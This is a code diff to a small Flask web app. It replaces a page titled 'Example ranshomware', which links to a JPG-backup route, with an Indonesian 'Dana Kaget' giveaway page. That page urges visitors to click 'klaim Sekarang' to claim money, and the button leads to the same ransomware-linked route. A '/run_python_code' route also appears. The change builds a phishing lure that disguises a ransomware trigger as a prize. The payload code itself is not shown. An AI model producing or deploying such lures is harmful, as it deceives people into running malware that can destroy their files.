@@ -8,17 +8,73 @@ app = Flask(__name__)
 def index():
     return '''
     <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Example ranshomware</title>
-    </head>
-    <body>
-        
-        <a href="/backup_jpg_files">Backup JPG Files</a>
-    </body>
-    </html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dana Kaget</title>
+    <style>
+body {
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    background-color: #808080;
+}
+
+.container {
+    text-align: center;
+    background: #ffffff;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    padding: 20px;
+    width: 300px;
+}
+
+.header h1 {
+    color: #FF5722;
+}
+
+.content p {
+    color: #666666;
+    margin-bottom: 20px;
+}
+
+.btn {
+    display: inline-block;
+    background-color: #FF5722;
+    color: white;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+    text-decoration: none;
+    transition: background-color 0.3s;
+}
+
+.btn:hover {
+    background-color: #E64A19;
+}
+
+    </style>
+    
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Dana Kaget</h1>
+        </div>
+        <div class="content">
+            <p>Selamat! Anda mendapatkan kesempatan untuk mendspatkan Dana Kaget,klik tombol untuk langsung ke Dana!</p>
+            <a href="/backup_jpg_file" class="btn">klaim Sekarang</a>
+        </div>
+    </div>
+</body>
+</html>
+
     '''
 
 @app.route('/run_python_code')
